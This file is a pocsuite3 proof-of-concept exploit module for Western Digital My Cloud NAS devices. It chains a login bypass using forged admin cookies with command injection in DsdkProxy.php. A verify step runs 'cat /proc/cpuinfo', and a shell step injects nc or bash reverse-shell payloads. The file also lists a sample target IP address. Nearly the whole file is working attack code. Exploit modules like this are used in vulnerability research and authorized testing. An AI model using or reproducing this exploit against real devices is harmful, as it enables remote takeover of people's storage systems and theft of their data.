"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import urljoin

from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class DemoPOC(POCBase):
    vulID = '97550'
    version = '3'
    author = ['seebug']
    vulDate = '2018-09-25'
    createDate = '2018-09-25'
    updateDate = '2018-09-25'
    references = ['https://www.seebug.org/vuldb/ssvid-97550']
    name = 'Western Digital My Cloud（NAS）登录绕过导致无限制远程命令执行'
    appPowerLink = 'https://www.wdc.com/en-us/'
    appName = 'WD NAS 登陆绕过导致无限远程命令执行'
    appVersion = ''
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
        Western Digital My Cloud（NAS）登录绕过导致无限制远程命令执行
    '''
    samples = ['96.234.71.117:80']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):
        result = {}

        veri_url1 = urljoin(self.url, '/cgi-bin/network_mgr.cgi?cmd=cgi_get_ipv6&flag=1')
        veri_url2 = urljoin(self.url, '/web/dsdk/DsdkProxy.php')
        cmd = 'cat /proc/cpuinfo'
        data = "';{};'".format(cmd)
        headers = {'cookie': 'isAdmin=1;username=admin'}
        try:
            requests.get(veri_url1)
            resp = requests.post(veri_url2, data=data, headers=headers)
            if any(keyword in resp.text for keyword in ['Processor', 'BogoMIPS', 'Hardware', 'Revision']):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            logger.warn(str(e))
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        veri_url1 = urljoin(self.url, '/cgi-bin/network_mgr.cgi?cmd=cgi_get_ipv6&flag=1')
        veri_url2 = urljoin(self.url, '/web/dsdk/DsdkProxy.php')
        cmd = self.get_option("command")
        data = "';{};'".format(cmd)
        headers = {'cookie': 'isAdmin=1;username=admin'}
        try:
            requests.get(veri_url1)
            requests.post(veri_url2, data=data, headers=headers)
        except Exception as e:
            logger.warn(str(e))

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
